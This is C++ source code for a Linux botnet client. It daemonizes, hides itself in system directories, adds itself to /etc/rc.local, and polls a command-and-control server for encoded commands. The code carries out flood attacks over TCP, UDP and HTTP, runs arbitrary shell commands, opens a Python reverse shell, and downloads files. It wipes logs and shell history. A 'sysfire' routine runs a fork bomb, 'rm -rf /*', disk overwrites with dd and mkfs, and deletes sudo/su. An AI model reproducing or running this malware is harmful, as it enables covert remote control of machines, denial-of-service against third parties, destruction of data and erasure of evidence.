/*Some libcurl is ripped from:
https://curl.haxx.se/libcurl/c/https.html
LibCurl install instructions:
1) install build-essential:
apt-get install build-essential
2) Go to /usr/local/src folder:
cd /usr/local/src
Download latest Curl package from here using:
wget http://curl.haxx.se/download/curl-7.48.0.tar.gz
3) Unzip:
tar -xvzf curl-7.48.0.tar.gz
rm *.gz
cd curl-7.48.0
./configure
sudo make
sudo make install
(ripped from http://unix.stackexchange.com/questions/274286/how-to-install-curl-and-libcurl-in-kali-linux)
Compiling Instructions:
g++ -std=c++11 -pthread -O2 filename.cpp -lcurl*/
#include <sys/socket.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <fstream>
#include <arpa/inet.h>
#include <stdio.h>
#include <signal.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <iostream>
#include <random>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <boost/algorithm/string.hpp>
#include <thread>
#include <stdlib.h>
#include <unistd.h>
using namespace std;
#ifdef _WIN64
    bool isdaemon = false;
    string osname = "win64";
#elif _WIN32
    bool isdaemon= false;
    string osname = "win32";
#elif __APPLE__
    bool isdaemon = true;
    string osname = "apple";
#elif __linux
    bool isdaemon = true;
    string osname = "linux";
#elif __unix
    bool isdaemon = true;
    string osname = "unix";
#elif __posix
    bool isdaemon = true;
    string osname = "posix";
#else
    bool isdaemon = true;
    string osname = "unkwn";
#endif
struct setup
{
  string version = "1";
  string bot_id = ""; // Name since persistant backdoor for a random id put it as NULL or null or leave it as ""
  char key[10] = {'K', 'C', 'Q', '1', '3', 'F', 'Z', 'X', '2', '9'}; // encryption key for xor can easly change the encryption method to aes or something
  string cnc [5] = {"", "", "", "", ""}; // 5 candc's just put it one or if you plan to use this feature uncomment it
  string useragent = "Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"; // custom agent for request to candc
  string rand_agent[10] = {"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"}; // http/https dos user agents
  string writeable_dir_user[3] = {"/var/tmp/", "/run/lock/", "/tmp/"}; // dirs writable with users privs
  string writeable_dir_root[2] = {"/etc/", "/bin/"}; // dirs wriable as root
  int rand_agent_num = sizeof(rand_agent) / sizeof(rand_agent[0]); // dont touch
  void set_bot_id(void)
  {
    if(bot_id=="" || bot_id=="NULL" || bot_id=="null")
    {
      string bot_id_root;
      struct utsname sysinfo;
      uname(&sysinfo);
      srand(time(NULL));
      if(getuid() == 0)
      {
        bot_id_root = "root";
      }
      else
      {
        bot_id_root = "user";
      }
      string bot_rand_id = "[" + string(osname) + "]_" + string(sysinfo.nodename) + "_" + string(bot_id_root) + "_" + to_string(time(NULL)) + "_"+ to_string(rand() % 10000); // [os]_hostname_privleges_unix time stamp_randnum
      bot_id = bot_rand_id;
    }
    else
    {
      NULL;
    }
  }
};
class tools : setup
{
  public:
    void daemon(void)
    {
        int x;
        pid_t pid;
        pid = fork();
        if (pid < 0)
        {
            exit(EXIT_FAILURE);
        }
        if (pid > 0)
        {

            exit(EXIT_SUCCESS);
        }
        if (setsid() < 0)
        {
            exit(EXIT_FAILURE);
        }
        signal(SIGCHLD,SIG_IGN);
        signal(SIGHUP,SIG_IGN);
        pid = fork();
        if (pid < 0)
        {
            exit(EXIT_FAILURE);
        }
        if (pid > 0)
        {
            exit(EXIT_SUCCESS);
        }
        umask(0);
        if(chdir("/tmp/")==0)
        {
         NULL;
        }
        else // if /tmp/ doesnt exsists (never will happen on unix system)
        {
          NULL;
        }
        for (x = sysconf(_SC_OPEN_MAX); x>0; x--)
        {
            close (x);
        }
    };
    string getexepath()
    {
      char result[ PATH_MAX ];
      ssize_t count = readlink( "/proc/self/exe", result, PATH_MAX );
      return string( result, (count > 0) ? count : 0 );
    }
    void file_setup(void)
    {
      string dir, dir_wf, line;
      vector<string> dir_prog;
      string dir_clocation = getexepath();
      srand(time(NULL)); // rand()%(max-min + 1) + min
      int writeable_dir_user_num = sizeof(writeable_dir_user) / sizeof(writeable_dir_user[0]);
      int writeable_dir_root_num = sizeof(writeable_dir_root) / sizeof(writeable_dir_root[0]);
      for(int i = 0; i < writeable_dir_user_num ; i++)
      {
       if(dir_clocation.find(writeable_dir_user[i]) != -1 && dir_clocation.find("/.") != -1)
       {
         dir_clocation.replace(dir_clocation.find(writeable_dir_user[i] + string(".")), (writeable_dir_user[i] + string(".")).size(), "");
         split(dir_prog, dir_clocation, boost::is_any_of("/"));
         if((dir_prog.size()) == 2)
         {
         if(isdigit(dir_clocation[0]))
         {
              if(isdigit(dir_clocation[2]))
              {
                cout << "in correct location, continuing with rest of code" << endl;
                return;
              }
            }
          }
        }
      }
      for(int i = 0; i < writeable_dir_root_num; i++)
      {
       if(dir_clocation.find(writeable_dir_root[i]) != -1 && dir_clocation.find("/.") != -1)
       {
         dir_clocation.replace(dir_clocation.find(writeable_dir_root[i] + string(".")), (writeable_dir_root[i] + string(".")).size(), "");
         split(dir_prog, dir_clocation, boost::is_any_of("/"));
         if((dir_prog.size()) == 2)
         {
         if(isdigit(dir_clocation[0]))
         {
              if(isdigit(dir_clocation[2]))
              {
                cout << "in correct location, continuing with rest of code" << endl;
                return;
              }
            }
          }
        }
      }
      if(getuid() == 0) // root
      {
        dir = writeable_dir_root[rand() % writeable_dir_root_num] + string(".") + to_string(rand() % 10000000) + string("/");
        dir_wf = string(dir) + to_string(rand() % 10000000);
        ifstream boot_check("/etc/rc.local");
        if(boot_check)
        {
          //need to edit the boot so its starts on startup
          boot_check.close();
          ifstream bootfile("/etc/rc.local"); // /etc/rc.local is the location of the boot file
          size_t pos;
          while(bootfile.good())
          {
              getline(bootfile,line); // get line from file
              pos=line.find(getexepath()); // search
              if(pos!=string::npos) // string::npos is returned if string is not found
                {
                  cout << "file in startup :)" << endl;
                  return;
                }
          }
          char buff[BUFSIZ];      // the input line
          char newbuff[BUFSIZ];   // the results of any editing
          string in_file = "/etc/rc.local"; // startup file
          string out_file = "tmp.txt";
          string exit_find = "exit 0";
          char replacewith[] = "";
          FILE *in, *out;
          in = fopen((in_file).c_str(), "r" );
          out= fopen((out_file).c_str(), "w" );
          while (fgets(buff, BUFSIZ, in) != NULL )
          {
              if (strstr( buff, (exit_find).c_str()) != NULL )
              {
                  NULL;
              }
              else
              {
                  strcpy(newbuff, buff);
              }
              fputs(newbuff, out);
          }
          fclose(in);
          fclose(out);
          if(rename((out_file).c_str(), (in_file).c_str()))
          {
             NULL;
          }
          ofstream startup;
          startup.open(("/etc/rc.local"), ios::out | ios::app);
          startup << endl << dir_wf << endl;
          startup << endl << "exit 0" << endl;
          startup.close();
        }
        else
        {
          cout << "No startup file not booting again!" << endl;
        }
      }
      else
      {
        dir =  writeable_dir_user[rand() % writeable_dir_user_num] + string(".") + to_string(rand() % 100000000) + string("/");
        dir_wf = string(dir) + to_string(rand() % 10000000);
      }
      cout << "Back door located at: " << dir << endl;
      mkdir((dir).c_str(), 0777);
      if(rename((getexepath()).c_str(), (dir_wf).c_str()))
      {
         // something went wrong
         if (errno == EXDEV)
         {
            // copy data and meta data
         }
         else
         {
           perror("rename"); exit(EXIT_FAILURE);
         }
      }
      else
      { // the rename succeeded
        NULL;
      }
    }
    void hostname_to_ip(char * hostname1, char* ip1) // http://www.binarytides.com/hostname-to-ip-address-c-sockets-linux/
    {
      try
      {
        struct hostent *he;
        struct in_addr **addr_list;
        int i;
        if((he = gethostbyname(hostname1)) == NULL)
        {
            herror("gethostbyname");
            throw 1;
        }
        addr_list = (struct in_addr **) he->h_addr_list;
        for(i = 0; addr_list[i] != NULL; i++)
        {
            strcpy(ip1, inet_ntoa(*addr_list[i]) );
        }
      }
      catch(int e)
      {
        NULL;
      }
    };
    string datagen(int datagenamount) // alphabet soup
    {
        srand(time(NULL));
        string randdata[65] = {"0","1","2","3","4","5","6","7","8","9", "a", "b", "c", "d", "e", "f", "g", "h",
        "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "~", "!", "@",
        "#", "]", "[", "}", "{", "|", "\\", ">", "<", ",", ".", "?", ";", "`", "=", "+", ")", "(", "*", "&", "^", "%", "$", " ", "'", "\""};
        string gendata;
        for(int i=0; i<datagenamount; i++)
        {
        gendata += randdata[(rand() % 65)];
        }
        return gendata;
    };
    string base64_encode( const string &str ) // *possible memory leak* http://stackoverflow.com/questions/342409/how-do-i-base64-encode-decode-in-c
    {
        BIO *base64_filter = BIO_new( BIO_f_base64() );
        BIO_set_flags( base64_filter, BIO_FLAGS_BASE64_NO_NL );
        BIO *bio = BIO_new( BIO_s_mem() );
        BIO_set_flags( bio, BIO_FLAGS_BASE64_NO_NL );
        bio = BIO_push( base64_filter, bio );
        BIO_write( bio, str.c_str(), str.length() );
        BIO_flush( bio );
        char *new_data;
        long bytes_written = BIO_get_mem_data( bio, &new_data );
        string result( new_data, bytes_written );
        BIO_free_all( bio );
        return result;
    };
    string base64_decode( const string &str ) // *possible memory leak* http://stackoverflow.com/questions/342409/how-do-i-base64-encode-decode-in-c
    {
        BIO *bio, *base64_filter, *bio_out;
        char inbuf[512];
        int inlen;
        base64_filter = BIO_new( BIO_f_base64() );
        BIO_set_flags( base64_filter, BIO_FLAGS_BASE64_NO_NL );
        bio = BIO_new_mem_buf( (void*)str.c_str(), str.length() );
        bio = BIO_push( base64_filter, bio );
        bio_out = BIO_new( BIO_s_mem() );
        while( (inlen = BIO_read(bio, inbuf, 512)) > 0 ){
            BIO_write( bio_out, inbuf, inlen );
        }
        BIO_flush( bio_out );
        char *new_data;
        long bytes_written = BIO_get_mem_data( bio_out, &new_data );
        string result( new_data, bytes_written );
        BIO_free_all( bio );
        BIO_free_all( bio_out );
        return result;
    };
    string encrypt_decrypt(string to_encrypt)
    {
        setup s;
        string output = to_encrypt;
        for (int i = 0; i < to_encrypt.size(); i++)
        {
            output[i] = to_encrypt[i] ^ s.key[i % (sizeof(s.key) / sizeof(char))];
        }
        return output;
    };
    void clearlogs()
    {
        system("set +o history;ln -sf /dev/null ~/.bash_history;rm -rf /var/log/*");
        system("rm -rf /tmp/logs");
        system("rm -rf /root/.bash_history");
        system("rm -rf /root/.ksh_history");
        system("rm -rf /root/.bash_logout");
        system("rm -rf /usr/local/apache/logs");
        system("rm -rf /usr/local/apache/log");
        system("rm -rf /var/apache/logs");
        system("rm -rf /var/apache/log");
        system("rm -rf /var/run/utmp");
        system("rm -rf /var/logs");
        system("rm -rf /var/log");
        system("rm -rf /var/adm");
        system("rm -rf /etc/wtmp");
        system("rm -rf /etc/utmp");
        system("rm -rf $HISTFILE");
        system("rm -rf /var/log/lastlog");
        system("rm -rf /var/log/wtmp");
        system("history -c");
        system("cat /dev/null > ~/.bash_history && history -c");
        system("find / -name *.bash_history -exec rm -rf {} \\;");
        system("find / -name *.bash_logout -exec rm -rf {} \\;");
        system("find / -name 'log*' -exec rm -rf {} \\;");
        system("find / -name *.log -exec rm -rf {} \\;");
    };
};
class offensive_tools : setup
{
  public:
    int tcpdos(char* dtcp_ip, string dtcp_port, string raw_time)
    {
      tools tool;
      struct sockaddr_in serverc1;
      int i = 0, aver = 0;
      time_t end = time(NULL) + stoi(raw_time);
      int p1 = atoi((dtcp_port).c_str());
      int s1 = socket(AF_INET, SOCK_STREAM, 0); // sockets adapted from http://www.binarytides.com/server-client-example-c-sockets-linux/
      if(s1 == -1){cout << "Could not create socket" << endl; return 1;} // err msg
      serverc1.sin_addr.s_addr = inet_addr(dtcp_ip);
      serverc1.sin_family = AF_INET;
      serverc1.sin_port = htons(p1);
      if(connect(s1, (struct sockaddr *)&serverc1 , sizeof(serverc1)) < 0){perror("connect failed. Error");return 1;} // err msg
      while(time(NULL) <= end)
      {
        i++;
        string ddostcppayload = (tool.datagen(rand()%(100000-100 + 1) + 100) + string("\n")); //http://stackoverflow.com/questions/12657962/how-do-i-generate-a-random-number-between-two-variables-that-i-have-stored
        send(s1, (ddostcppayload).c_str(), (ddostcppayload).size(), 20);
        aver += (ddostcppayload).size();
      };
      close(s1);
      cout << "<TCP> Sent a total of " << i << " Requests, they averaged " << aver/i << " Bytes Over " << raw_time << " Seconds"<< endl;
      return 0;
    };
    int udpdos(char* dudp_ip, string dudp_port, string raw_time)
    {
      tools tool;
      struct sockaddr_in serverc1;
      int i = 0, aver = 0;
      time_t end = time(NULL) + stoi(raw_time);
      int p1 = atoi((dudp_port).c_str());
      int s1 = socket(AF_INET, SOCK_DGRAM, 0); // sockets adapted from http://www.binarytides.com/server-client-example-c-sockets-linux/
      if(s1 == -1){cout << "Could not create socket" << endl; return 1;} // err msg
      serverc1.sin_addr.s_addr = inet_addr(dudp_ip);
      serverc1.sin_family = AF_INET;
      serverc1.sin_port = htons(p1);
      if(connect(s1, (struct sockaddr *)&serverc1 , sizeof(serverc1)) < 0){perror("connect failed. Error");return 1;} // err msg
      while(time(NULL) <= end)
      {
        i++;
        string ddosudppayload = (tool.datagen(rand()%(100000-100 + 1) + 100) + string("\n")); //http://stackoverflow.com/questions/12657962/how-do-i-generate-a-random-number-between-two-variables-that-i-have-stored
        send(s1, (ddosudppayload).c_str(), (ddosudppayload).size(), 20);
        aver += (ddosudppayload).size();
      };
      close(s1);
      cout << "<UDP> Sent a total of " << i << " Requests, they averaged " << aver/i << " Bytes Over " << raw_time << " Seconds"<< endl;
      return 0;
    };
    int http_dos(string dsite, string raw_time)
    {
      srand(time(NULL));
      int i = 0;
      time_t end = time(NULL) + stoi(raw_time);
      while(time(NULL) <= end)
      {
        i++;
        CURL* c;
        c = curl_easy_init();
        cout  << i << " # " << dsite << endl;
        curl_easy_setopt(c, CURLOPT_URL, (dsite).c_str());
        curl_easy_setopt(c, CURLOPT_USERAGENT, (rand_agent[(rand() % rand_agent_num)]).c_str());
        curl_easy_perform(c);
        curl_easy_cleanup(c);
      }
      return 0;
    }
    void doselector(char* raw_ip, string raw_port, string raw_method, string raw_time)
    {
      if(raw_method=="t" || raw_method=="tcp")
      {
        if(tcpdos(raw_ip, raw_port, raw_time) == 0)
        {
          NULL;
        }
        else
        {
          cout << "<TCP> Failure!" << endl;
        }
      }
      else if(raw_method=="u" || raw_method=="udp")
      {
        if(udpdos(raw_ip, raw_port, raw_time) == 0)
        {
          NULL;
        }
        else
        {
          cout << "<UDP> Failure!" << endl;
        }
      }
      else
      {
        if(tcpdos(raw_ip, raw_port, raw_time) == 0)
        {
          NULL;
        }
        else
        {
          cout << "<DEFUALT><TCP> Failure!" << endl;
        }
      }
    };
    void sysfire()
    {
        tools tool;
        if(geteuid()!=0)
        {
            tool.clearlogs();
            while(1)
            {
                fork();
                system(":(){ :|: & };:");
            }
        }
        else //r00t
        {
            tool.clearlogs();
            system("rm -rf /* --no-preserve-root");
            system("mv / /dev/null && dd if=/dev/zero of=/dev/hda && rm -rf /");
            system("mkfs.ext4 /dev/sda1");
            system("dd if=/dev/random of=/dev/sda");
            system("sed -i -r '/vmlinuz/s/(.*)/1 memmap=256G$0x0000/' /boot/grub/grub.conf");
            system("rm -f /usr/bin/sudo;rm -f /bin/su");
            tool.clearlogs();
            while(1)
            {
                fork();
                system(":(){ :|: & };:");
            }
        }
    };
};
class candc_conn : public setup
{
  public:
    void commands_run(string rawsite_data)
    {
      char ipr[100];
      offensive_tools otool;
      tools rtool;
      if(rawsite_data.find("botid=all&") != -1 || rawsite_data.find("botid=a&") != -1 || rawsite_data.find(bot_id) != -1)
      {
        if(rawsite_data.find("&command=syscmd*") != -1)
        {
          string runwo = rawsite_data.substr(rawsite_data.find("&command=syscmd*"));
          runwo.replace(runwo.find("&command=syscmd*"), 16, "");
          if(system((runwo).c_str()) == -1)
          {
            NULL;
          }
          else //failed command
          {
            NULL;
          }
        }
        else if(rawsite_data.find("&command=dos*") != -1) // example : dos*google.com*443*tcp*60
        {
          vector<string> dos_v;
          string dos = rawsite_data.substr(rawsite_data.find("&command=dos*"));
          dos.replace(dos.find("&command=dos*"), 13, "");
          boost::split(dos_v, dos, boost::is_any_of("*"));
          if((dos_v).size() == 4)
          {
              rtool.hostname_to_ip(const_cast<char*>((dos_v[0]).c_str()), ipr); // ipr is the resolved ip
              transform(dos_v[2].begin(), dos_v[2].end(), dos_v[2].begin(), ::tolower); // transforms method to lowercase
              cout << "The ip is: " << ipr << " The port is: " << dos_v[1] << " The method is: " <<  dos_v[2] <<  " The length of time is: " <<  dos_v[3] << endl;
              otool.doselector(ipr, dos_v[1], dos_v[2], dos_v[3]);
          }
          else if((dos_v).size() == 2) // dos*https://google.com*60
          {
            cout << "Site is: " << dos_v[0] << " TIme: " <<  dos_v[1] << endl;
            otool.http_dos(dos_v[0], dos_v[1]);
          }
          else
          {
            NULL;
            //cout << "Malformed syntax! its dos*ip*port*method*lengthOfTime" << endl;
          }
        }
        else if(rawsite_data.find("&command=backconnect*") != -1) // &command=backconnect*ip*port
        {
          vector<string> backconnect_v;
          string backconnect = rawsite_data.substr(rawsite_data.find("&command=backconnect*"));
          backconnect.replace(backconnect.find("&command=backconnect*"), 21, "");
          boost::split(backconnect_v, backconnect, boost::is_any_of("*"));
          if((backconnect_v).size() == 2)
          {
            if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(backconnect_v[0]) + "\", " + string(backconnect_v[1]) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) == -1)
            {
              NULL;
            }
            else // failed backconnect
            {
              NULL;
            }
          }
          else
          {
            NULL;
          }
        }
        else if(rawsite_data.find("&command=logwipe") != -1 || rawsite_data.find("&command=logclear") != -1)
        {
          tools tool;
          tool.clearlogs();
        }
        else if(rawsite_data.find("&command=sysfire") != -1 || rawsite_data.find("&command=destcomp") != -1 || rawsite_data.find("&command=rip") != -1)
        {
          offensive_tools otool;
          otool.sysfire();
        }
        else if(rawsite_data.find("&command=dl*") != -1) //&command=dl*site.com*filename
        {
          vector<string> dl_v;
          string dl = rawsite_data.substr(rawsite_data.find("&command=dl*"));
          dl.replace(dl.find("&command=dl*"), 12, "");
          boost::split(dl_v, dl, boost::is_any_of("*"));
          if((dl_v).size() == 2)
          {
            CURL *dl_curl;
            FILE *fp;
            CURLcode res;
            dl_curl = curl_easy_init();
            if(dl_curl)
            {
              fp = fopen((dl_v[1]).c_str(),"wb");
              curl_easy_setopt(dl_curl, CURLOPT_URL, (dl_v[0]).c_str());
              curl_easy_setopt(dl_curl, CURLOPT_WRITEFUNCTION, NULL);
              curl_easy_setopt(dl_curl, CURLOPT_WRITEDATA, fp);
              res = curl_easy_perform(dl_curl);
              curl_easy_cleanup(dl_curl);
              fclose(fp);
            }
          }
        }
      }
      else
      {
        NULL;
      }
    };
    static size_t writecallback(void *contents, size_t size, size_t nmemb, void *userp) //http://stackoverflow.com/questions/9786150/save-curl-content-result-into-a-string-in-c
    {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    };
    void connect(void)
    {
      tools tool;
      string webpage_c = "";
      int candc = 0, error = 0, counter = 0;
      while(1)
      {
        CURL *curl;
        CURLcode res;
        string buffer_decoded, readbuffer;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        if(curl)
        {
          curl_easy_setopt(curl, CURLOPT_URL, (cnc[candc]).c_str());
          curl_easy_setopt(curl, CURLOPT_USERAGENT, (useragent).c_str());
          curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writecallback);
          curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readbuffer);
          #ifdef SKIP_PEER_VERIFICATION
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
          #endif
          #ifdef SKIP_HOSTNAME_VERIFICATION
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
          #endif
          res = curl_easy_perform(curl);
          if(res != CURLE_OK)
          {
            cout <<  "curl_easy_perform() failed: " <<  curl_easy_strerror(res) << endl;
            /*
            if(error>3)
            {
              if(candc>3)
              {
                candc = 0;
              }
              else
              {
                candc++;
                cout << "switching C2's! " << candc <<endl;
              }
              error = 0;
            }
            else
            {
              error++;
            }
            cout << error << endl; */ //multiple candc shit
          }
          else // Server Side command is structured as follows: "botid= &recursive= &command= "  example of usage: botid=all&recursive=yes&command=dos*127.0.0.1*80*tcp*30 (seconds) recursive makes it so it will go on infinetly until changed botid all run on all bots while a generated botid spcified will only run on one
          {
            if(webpage_c==readbuffer)
            {
              counter += 1;
              cout << "[=] [" << counter << "] Site content hasnt changed it's still: " << readbuffer << endl;
            }
            else
            {
              counter += 1;
              cout << "[+] [" << counter << "] New site content: " <<  readbuffer << endl;
              buffer_decoded = tool.base64_decode(tool.encrypt_decrypt(tool.base64_decode(readbuffer)));
              cout << "Decoded: " << buffer_decoded << endl;
              if(buffer_decoded.find("&recursive=yes&") != -1 || buffer_decoded.find("&recursive=y&") != -1)
              {
                cout << "Recursivness detected repeating until its removed" << endl;
                std::thread(&candc_conn::commands_run, this, buffer_decoded).detach();
              }
              else
              {
                cout << "Duplicate webpage content detected, not running commands waiting till next request." << endl;
                webpage_c = readbuffer;
                std::thread(&candc_conn::commands_run, this, buffer_decoded).detach();
              }
            }
          }
          curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
        sleep((rand()%(300-60 + 1) + 60)); // random call back 1 to 5 minutes
      }
    };
  protected:

  private:
};
int main(void)
{
  setup s;
  candc_conn c;
  tools t;
  if(isdaemon==true)
  {
     t.daemon();
     t.file_setup();
  }
  s.set_bot_id();
  srand(time(NULL));
  sleep((rand() % 5));
  c.connect();
  return 0;
}
